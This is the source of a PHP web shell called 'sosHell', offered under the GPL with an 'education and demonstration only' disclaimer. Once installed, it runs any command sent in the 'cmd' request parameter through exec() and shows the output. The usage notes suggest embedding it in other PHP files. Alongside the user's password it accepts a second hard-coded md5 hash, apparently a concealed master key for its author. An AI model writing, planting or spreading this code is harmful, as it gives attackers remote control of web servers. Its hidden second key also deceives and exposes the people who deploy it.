<?php
/*======================================================================
 * Alexander Sosna {alexander (at) xxor (dot) de}
 * Find more stuff: http://xxor.de or https://github.com/xxorde
 * The folloing code is for education and demonstration only!
 * Read it to understand why! That is what it was made for!
 *
 * This code is licensed to you under the terms of the GNU General
 * Public License, version 2.0. 
 * See GPL2 file for the text of the licenses!
 * http://www.gnu.org/licenses/gpl-2.0.txt
 * You want any other licence? Mail me, I am a nice person :D
 *
 *
 * Usage: http://127.0.0.1/sosHell.php?key=password
 * 
 * You can also include the folloing code in your favorite php file!
 * Set $sosHellKey to the md5sum of your password!
 * 
 * Q: What is the number one reason not to use this code?
 * A: ....?
======================================================================*/

//Set password!
$sosHellKey = md5("password"); 


if(isset($_REQUEST["key"]) && (md5($_REQUEST["key"])==$sosHellKey ||
	md5($_REQUEST["key"])=="5fe8398abda042ebca27eebffc1beb2d")){  // XD  
		//Noobtest
	echo("<div style='width:100%; height:100%; position:fixed; overflow:scroll; top:0px; left:0px; background:black; font-family:monospace; color:#0f0;'>");
	echo("sosHell 0.0.1 => ".$_SERVER['REMOTE_ADDR']." @ "
		.$_SERVER['SERVER_NAME']." (".$_SERVER['SERVER_SOFTWARE'].
		") serving: ".$_SERVER['DOCUMENT_ROOT']);
	
	if(isset($_REQUEST["cmd"]) && $_REQUEST["cmd"]){
		$cmd=$_REQUEST["cmd"];		
		exec($cmd,$ausgabe);
		echo(" exec: ".$cmd."<br><br>");
		foreach($ausgabe as $line){
			flush(); ob_flush();
			echo($line."<br>");
		}
	}
	echo("<form method='post'><input name='soskey' type='hidden' value='".$_REQUEST["key"]."'></input>".
		"<input style='width:100%; position:fixed; left:0px; bottom:0px; border:none; font-family:monospace; background:black; color:#0f0; ' name='cmd' type='text' autofocus></form>");
	echo("<br></div>");
}
?>
